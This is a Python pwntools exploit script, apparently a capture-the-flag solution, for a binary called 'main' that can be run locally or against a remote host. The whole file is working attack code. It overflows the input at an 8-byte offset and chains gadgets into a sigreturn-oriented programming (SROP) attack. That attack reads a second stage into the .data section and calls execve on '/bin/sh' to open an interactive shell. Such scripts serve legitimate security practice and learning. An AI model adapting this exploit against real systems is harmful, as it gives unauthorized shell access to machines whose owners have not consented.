#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('main')

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *get_input+93
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():
    offset = 8

    mov_eax_edi = 0x0000000000401086 # mov edi, eax ; ret
    mov_eax_9 = 0x000000000040107f # mov eax, 9 ; ret
    mov_eax_6 = 0x0000000000401079 # mov eax, 6 ; ret
    add_eax_edi = 0x00000000004010a2 # add eax, edi ; ret

    syscall = 0x0000000000401020 # syscall

    data = 0x402000

    frame = SigreturnFrame()
    frame.rax = 0x0
    frame.rsi = data
    frame.rdx = 0x200
    frame.rsp = data + 8
    frame.rip = syscall

    sh = SigreturnFrame()
    sh.rax = 0x3b
    sh.rdi = data + 8
    sh.rsi = 0x0
    sh.rdx = 0x0
    sh.rip = syscall

    payload = flat({
        offset: [
            mov_eax_6,
            mov_eax_edi,
            mov_eax_9,
            add_eax_edi,
            syscall,
            bytes(frame)
        ]
    })

    pivot = flat([
        mov_eax_6,
        mov_eax_edi,
        mov_eax_9,
        add_eax_edi,
        syscall,
        bytes(sh)
    ])


    io.sendline(payload)
    io.sendline(b'\x00'*8 + b'/bin/sh\x00' + pivot)

    io.interactive()


def main():
    
    init()
    solve()    

if __name__ == '__main__':
    main()

